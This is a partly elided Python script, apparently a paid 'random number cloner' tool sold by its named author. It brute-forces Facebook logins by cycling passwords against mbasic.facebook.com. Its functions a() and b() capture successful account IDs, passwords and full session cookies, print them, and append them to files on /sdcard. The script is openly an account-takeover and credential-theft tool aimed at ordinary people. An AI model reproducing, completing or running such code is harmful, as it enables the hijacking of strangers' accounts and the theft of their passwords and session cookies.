#(SAT MANTAL YT)(RAIHAN.KHAN)
#WhatsApp : 01618921827
#Github : RAIHAN-CYBER-145
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Raihan")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/RAIHAN-CYBER-145/Raihan-khan/blob/main/RA1H4N.txt').text
...
.##.....##.##.....##.####.##.....##.##.....##.##....##
    ...
    │ [✓] AUTHOR   : RAIHAN-KHAN💚            │
    │ [✓] GITHUB   : RAIHAN-CYBER-145                │
    │ [✓] WHATSAPP : +8801618921827        │
    │ [✓] VERSION  : XNXX                   │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m NAMTA MONE RAKHBEN VIRUS TEAM-MANTAL & RAIHAN CYBER ™ \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  RAIHAN SIR TOOLS ER PRICE CHILO 6K TK  \033[1;37m ")
  print(f"")
  ...
  try:
    httpCaht = requests.get("https://github.com/RAIHAN-CYBER-145/Raihan-khan/blob/main/RAIHAN.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801618921827?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801618921827');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/RAIHAN.CYBER.143.MYMENSINGH.ER.KING');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.youtube.com/@Mohammad.Raihan.143');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSPY1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [MANTAL💚-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [🔴] COOKIE : '+coki)
                open('/sdcard/MANTAL💚-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/MANTAL1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRAIHAN1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/MANTAL🥰-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAIHAN-OK] '+cid+' | '+ps+'\33[0;92m')
